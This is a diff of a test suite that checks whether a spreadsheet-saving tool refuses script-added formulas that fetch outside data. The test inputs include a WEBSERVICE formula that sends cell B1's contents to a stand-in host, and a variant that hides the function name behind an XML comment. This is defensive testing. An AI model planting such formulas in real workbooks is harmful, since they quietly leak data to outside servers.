@@ -596,9 +596,10 @@ saveFile('query.xlsx', fflate.zipSync(parts))
     )
   })
 
-  it('refuses a formula the script added that fetches data from outside the file, but keeps one the workbook had', async () => {
-    const refusal = (name: string, part = 'xl/worksheets/sheet1.xml') =>
-      `"${name}" was not saved: the script added a formula that fetches data from outside the file (WEBSERVICE, IMAGE, RTD or an IMPORT function), which Excel or Google Sheets runs when the workbook calculates, in ${part} (`
+  const refusal = (name: string, part = 'xl/worksheets/sheet1.xml') =>
+    `"${name}" was not saved: the script added a formula that fetches data from outside the file (WEBSERVICE, IMAGE, RTD or an IMPORT function), which Excel or Google Sheets runs when the workbook calculates, in ${part} (`
+
+  it('refuses a formula the script added through Excelize that fetches data from outside the file', async () => {
     for (const formula of [
       'WEBSERVICE("https://example.com/?q="&B1)',
       'IMAGE("https://example.com/a.png")',
@@ -623,6 +624,9 @@ f.SetConditionalFormat('Sheet1', 'A1:A5', [{ Type: '2_color_scale', Criteria: '=
 saveFile('a.xlsx', f.WriteToBuffer().buffer)
 `
     expect(await errorOf(scale)).toStartWith(refusal('a.xlsx'))
+  })
+
+  it('refuses a fetching formula written by hand, however the XML hides it', async () => {
     // Built by hand, so the check sees the XML exactly as written. A UTF-8 byte-order mark is valid XML too.
     for (const [cell, mark] of [
       ['<f>WEB<!-- -->SERVICE("https://example.com")</f>', ''],
@@ -642,7 +646,9 @@ saveFile('a.xlsx', fflate.zipSync(parts))
 `
       expect(await errorOf(script)).toStartWith(refusal('a.xlsx'))
     }
+  })
 
+  it('keeps a fetching formula the workbook had, and look-alikes that fetch nothing', async () => {
     const engines = await loadSpreadsheetEngines(
       await packageFile('excelize-wasm/excelize.wasm.gz'),
       await packageFile('@ironcalc/wasm/wasm_bg.wasm'),
